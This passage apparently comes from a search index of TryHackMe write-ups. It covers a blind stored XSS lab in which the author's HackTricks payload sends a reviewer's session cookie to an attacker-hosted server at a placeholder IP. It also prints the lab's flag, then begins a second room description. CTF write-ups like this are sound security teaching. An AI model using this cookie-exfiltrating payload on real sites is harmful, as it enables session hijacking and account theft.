I will however explain why that particular type of XSS makes sense here:  </p> <ul> <li>As mentioned, the application has advised that another user will be reviewing the contents of the form that is submitted. This is where the \"stored\" bit comes from - the attack needs to persist in the form for when the reviewer's browser renders it.  </li> <li>Once the form is submitted, I lose visibility of it entirely. This is the \"blind\" part of the attack, and means I need to have the payload execute a command that does something more than display a message on the reviewer's screen (e.g., like with an <code>&lt;alert&gt;</code> tag) and instead have it pass sensitive information from the reviewer's session to somewhere that I can see it.  </li> </ul> <p>With those two points in mind, I decided to use a payload from HackTricks with the intention of having the reviewer's session cookie sent to an HTTP server I was hosting on my attacking machine: <code>&lt;img src=x onerror=this.src=\"http://&lt;ATTACKING_IP&gt;/?c=\"+document.cookie&gt;</code> </p> <p>After initiating a Python web server on my attacking machine, I entered the payload into each of the boxes on the \"Survey\" form (for speed - if I was being thorough, it would have been beneficial to figure out which field was vulnerable) and got a hit instantly back in my web server, which surprisingly contained the flag: </p> What is the flag? <pre><code>THM{XSS_CuP1d_Str1k3s_Ag41n}\n</code></pre> <p>Date completed: 15/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","xss"]},{"location":"tryhackme/love_at_first_breach/hidden_deep_into_my_heart/","title":"Hidden Deep Into my Heart","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: Hidden Deep Into my Heart</p>","tags":["tryhackme","room","easy","offensive","web"]},{"location":"tryhackme/love_at_first_breach/hidden_deep_into_my_heart/#description","title":"Description","text":"<p>Find what's hidden deep inside this website.</p> <p>\"My Dearest Hacker, Cupid's Vault was designed to protect secrets meant to stay hidden forever.
